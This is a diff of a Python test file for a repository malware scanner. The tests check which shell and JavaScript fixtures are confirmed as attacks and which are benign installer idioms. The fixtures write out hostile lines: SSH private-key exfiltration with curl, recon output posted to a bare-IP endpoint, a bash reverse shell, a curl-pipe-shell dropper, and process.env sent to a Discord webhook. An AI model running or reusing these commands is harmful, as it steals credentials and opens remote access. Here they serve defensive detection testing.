@@ -74,11 +74,11 @@ def test_enumeration_only_does_not_confirm(tmp_path):
 
 
 def test_recon_and_exfil_implant_confirms(tmp_path):
-    # Full attack surface: enumeration PAIRED with egress is a recon-and-report
-    # implant -- exactly the "hidden network attack / viral implant" we hunt.
+    # A recon-and-report implant: enumeration piped to an ATTACKER host. The
+    # exfil-to-attacker-host is itself a Tier-A signature (host-gated).
     (tmp_path / "implant.sh").write_text(
         "#!/bin/bash\nINFO=$(whoami; uname -a; id)\n"
-        "curl -X POST https://discord.com/api/webhooks/9/abc -d \"$INFO\"\n",
+        "curl -X POST http://185.220.101.5/c2 -d \"$INFO\"\n",
         encoding="utf-8",
     )
     result = analyze_repo(tmp_path, "evil/implant")
@@ -87,12 +87,74 @@ def test_recon_and_exfil_implant_confirms(tmp_path):
     assert "enumeration" in cats and "exfiltration" in cats
 
 
+def test_secret_file_exfil_confirms_alone(tmp_path):
+    # Posting a secret FILE out is credential theft regardless of host (Tier A).
+    (tmp_path / "steal.sh").write_text(
+        "#!/bin/bash\ncurl -d @~/.ssh/id_rsa https://collector.example.com/u\n",
+        encoding="utf-8",
+    )
+    assert analyze_repo(tmp_path, "evil/grab").confirmed
+
+
+def test_ci_writing_deploy_key_does_not_confirm(tmp_path):
+    # The opencode FP: CI legitimately WRITES a deploy key from a secret (it does
+    # not read+exfil it). ssh-keys is a lone Tier-B -> not enough.
+    wf = tmp_path / ".github" / "workflows"
+    wf.mkdir(parents=True)
+    (wf / "publish.yml").write_text(
+        'steps:\n  - run: |\n      echo "$AUR_KEY" > ~/.ssh/id_rsa\n'
+        "      chmod 600 ~/.ssh/id_rsa\n"
+        "      curl -fsSL https://sh.rustup.rs | sh\n",
+        encoding="utf-8",
+    )
+    assert not analyze_repo(tmp_path, "legit/tool").confirmed
+
+
 def test_reverse_shell_confirms(tmp_path):
     # A single unambiguous network-attack signature confirms on its own.
     (tmp_path / "shell.sh").write_text(
         "#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n", encoding="utf-8"
     )
     assert analyze_repo(tmp_path, "evil/rsh").confirmed
+
+
+def test_curl_install_reputable_host_does_not_confirm(tmp_path):
+    # The opencode/PentestGPT false positives: curl|sh to reputable installers is
+    # the standard developer idiom, not malware.
+    (tmp_path / "install.sh").write_text(
+        "#!/bin/bash\n"
+        "curl -fsSL https://sh.rustup.rs | sh\n"
+        "curl -fsSL https://bun.sh/install | bash\n"
+        "curl -fsSL https://deb.nodesource.com/setup_20.x | bash -\n"
+        "whoami; uname -a\n",   # recon co-occurs, but there is no attack
+        encoding="utf-8",
+    )
+    assert not analyze_repo(tmp_path, "legit/tool").confirmed
+
+
+def test_curl_pipe_shell_attacker_host_confirms(tmp_path):
+    # Same idiom, attacker host (bare IP) -> a dropper. Confirms alone (Tier A),
+    # even though one download_exec is below the corroboration threshold.
+    (tmp_path / "install.sh").write_text(
+        "#!/bin/bash\ncurl -fsSL http://185.220.101.5/a.sh | sh\n", encoding="utf-8"
+    )
+    assert analyze_repo(tmp_path, "evil/dropper").confirmed
+
+
+def test_lone_discord_webhook_needs_corroboration(tmp_path):
+    # A project's own Discord notifier (Tier B) must not confirm on its own...
+    (tmp_path / "notify.js").write_text(
+        "fetch('https://discord.com/api/webhooks/1/abc', {method:'POST'});\n",
+        encoding="utf-8",
+    )
+    assert not analyze_repo(tmp_path, "legit/app").confirmed
+    # ...but webhook + an env dump (Tier A) is real exfil.
+    (tmp_path / "steal.js").write_text(
+        "fetch('https://discord.com/api/webhooks/1/abc',"
+        "{method:'POST',body:JSON.stringify(process.env)});\n",
+        encoding="utf-8",
+    )
+    assert analyze_repo(tmp_path, "evil/app").confirmed
 
 
 def test_semgrep_flag_alone_does_not_confirm(monkeypatch, tmp_path):
